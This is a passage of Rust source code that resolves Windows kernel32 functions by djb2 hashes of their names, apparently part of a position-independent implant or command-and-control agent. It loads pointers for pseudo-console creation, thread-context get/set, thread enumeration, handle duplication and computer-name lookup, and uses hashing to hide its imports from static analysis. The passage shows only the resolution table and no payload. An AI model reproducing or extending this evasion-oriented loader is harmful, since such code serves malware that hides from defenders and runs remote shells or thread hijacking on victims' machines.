        instance.k32.open_service_w = core::mem::transmute(k_open_service_w_addr);

        let k_create_thread_addr = ldr_function(instance.k32.module_base, 0x98baab11);
        instance.k32.create_thread = core::mem::transmute(k_create_thread_addr);

        let k_terminate_thread_addr = ldr_function(instance.k32.module_base, 0x2f0c10a6);
        instance.k32.terminate_thread = core::mem::transmute(k_terminate_thread_addr);

        let k_get_current_thread_addr = ldr_function(instance.k32.module_base, 0xa8a2720);
        instance.k32.get_current_thread = core::mem::transmute(k_get_current_thread_addr);

        // GetCurrentThreadId hash: djb2("GETCURRENTTHREADID") = 0xd5b078cd
        let k_get_current_thread_id_addr = ldr_function(instance.k32.module_base, 0xd5b078cd);
        instance.k32.get_current_thread_id = core::mem::transmute(k_get_current_thread_id_addr);

        // GetCurrentProcessId hash: djb2("GETCURRENTPROCESSID") = 0x0917ded4
        let k_get_current_process_id_addr = ldr_function(instance.k32.module_base, 0x0917ded4);
        instance.k32.get_current_process_id = core::mem::transmute(k_get_current_process_id_addr);

        // GetComputerNameA hash: djb2("GETCOMPUTERNAMEA") = 0x8c52da36
        let k_get_computer_name_a_addr = ldr_function(instance.k32.module_base, 0x8c52da36);
        instance.k32.get_computer_name_a = core::mem::transmute(k_get_computer_name_a_addr);

        // DuplicateHandle hash: djb2("DUPLICATEHANDLE") = 0x95f45a6c
        let k_duplicate_handle_addr = ldr_function(instance.k32.module_base, 0x95f45a6c);
        instance.k32.duplicate_handle = core::mem::transmute(k_duplicate_handle_addr);

        let k_local_alloc_addr = ldr_function(instance.k32.module_base, 0x72073b5b);
        instance.k32.local_alloc = core::mem::transmute(k_local_alloc_addr);

        let k_local_free_addr = ldr_function(instance.k32.module_base, 0x32030e92);
        instance.k32.local_free = core::mem::transmute(k_local_free_addr);

        let k_initialize_proc_thread_attribute_list_addr = (get_instance().unwrap().k32.get_proc_address)(
            instance.k32.module_base as *mut c_void,
            "InitializeProcThreadAttributeList\0".as_bytes().as_ptr(),
        )
        .unwrap();
        instance.k32.initialize_proc_thread_attribute_list = core::mem::transmute(k_initialize_proc_thread_attribute_list_addr);

        let k_update_proc_thread_attribute_addr = (get_instance().unwrap().k32.get_proc_address)(
            instance.k32.module_base as *mut c_void,
            "UpdateProcThreadAttribute\0".as_bytes().as_ptr(),
        )
        .unwrap();
        instance.k32.update_proc_thread_attribute = core::mem::transmute(k_update_proc_thread_attribute_addr);

        let k_heap_alloc_addr = (get_instance().unwrap().k32.get_proc_address)(
            instance.k32.module_base as *mut c_void,
            "HeapAlloc\0".as_bytes().as_ptr(),
        )
        .unwrap();
        instance.k32.heap_alloc = core::mem::transmute(k_heap_alloc_addr);

        let k_get_process_heap_addr = ldr_function(instance.k32.module_base, 0x36c007a2);
        instance.k32.get_process_heap = core::mem::transmute(k_get_process_heap_addr);

        let k_resume_thread_addr = ldr_function(instance.k32.module_base, 0x8dc7e12e);
        instance.k32.resume_thread = core::mem::transmute(k_resume_thread_addr);

        let k_terminate_process_addr = ldr_function(instance.k32.module_base, 0xf3c179ad);
        instance.k32.terminate_process = core::mem::transmute(k_terminate_process_addr);

        let k_exit_process_addr = ldr_function(instance.k32.module_base, 0xd154167e);
        instance.k32.exit_process = core::mem::transmute(k_exit_process_addr);

        let k_create_pseudo_console_addr = ldr_function(instance.k32.module_base, 0xacb9669c);
        instance.k32.create_pseudo_console = core::mem::transmute(k_create_pseudo_console_addr);

        let k_create_directory_w_addr = ldr_function(instance.k32.module_base, 0xb717be65);
        instance.k32.create_directory_w = core::mem::transmute(k_create_directory_w_addr);

        let k_set_file_attributes_w_addr = ldr_function(instance.k32.module_base, 0x1c1444af);
        instance.k32.set_file_attributes_w = core::mem::transmute(k_set_file_attributes_w_addr);

        let k_get_current_directory_w_addr = ldr_function(instance.k32.module_base, 0x3d54a9f4);
        instance.k32.get_current_directory_w = core::mem::transmute(k_get_current_directory_w_addr);

        let k_get_thread_context_addr = ldr_function(instance.k32.module_base, 0x6a967222);
        instance.k32.get_thread_context = core::mem::transmute(k_get_thread_context_addr);

        let k_set_thread_context_addr = ldr_function(instance.k32.module_base, 0xfd1438ae);
        instance.k32.set_thread_context = core::mem::transmute(k_set_thread_context_addr);

        // GetSystemTimeAsFileTime - use GetProcAddress
        let k_get_system_time_as_file_time_addr = (get_instance().unwrap().k32.get_proc_address)(
            instance.k32.module_base as *mut c_void,
            "GetSystemTimeAsFileTime\0".as_bytes().as_ptr(),
        )
        .unwrap();
        instance.k32.get_system_time_as_file_time = core::mem::transmute(k_get_system_time_as_file_time_addr);

        // VirtualQueryEx - use GetProcAddress
        let k_virtual_query_ex_addr = (get_instance().unwrap().k32.get_proc_address)(
            instance.k32.module_base as *mut c_void,
            "VirtualQueryEx\0".as_bytes().as_ptr(),
        )
        .unwrap();
        instance.k32.virtual_query_ex = core::mem::transmute(k_virtual_query_ex_addr);

        // OpenThread hash: djb2("OPENTHREAD") = 0xc7073a8f
        let k_open_thread_addr = ldr_function(instance.k32.module_base, 0xc7073a8f);
        instance.k32.open_thread = core::mem::transmute(k_open_thread_addr);

        // Thread32First hash: djb2("THREAD32FIRST") = 0x2fd54d2a
        let k_thread_32_first_addr = ldr_function(instance.k32.module_base, 0x2fd54d2a);
        instance.k32.thread_32_first = core::mem::transmute(k_thread_32_first_addr);

        // Thread32Next hash: djb2("THREAD32NEXT") = 0x85585ce1
        let k_thread_32_next_addr = ldr_function(instance.k32.module_base, 0x85585ce1);
        instance.k32.thread_32_next = core::mem::transmute(k_thread_32_next_addr);

        // FormatMessageW hash: djb2("FORMATMESSAGEW") = 0x5f82678a
        let k_format_message_w_addr = ldr_function(instance.k32.module_base, 0x5f82678a);
        instance.k32.format_message_w = core::mem::transmute(k_format_message_w_addr);
    }
}
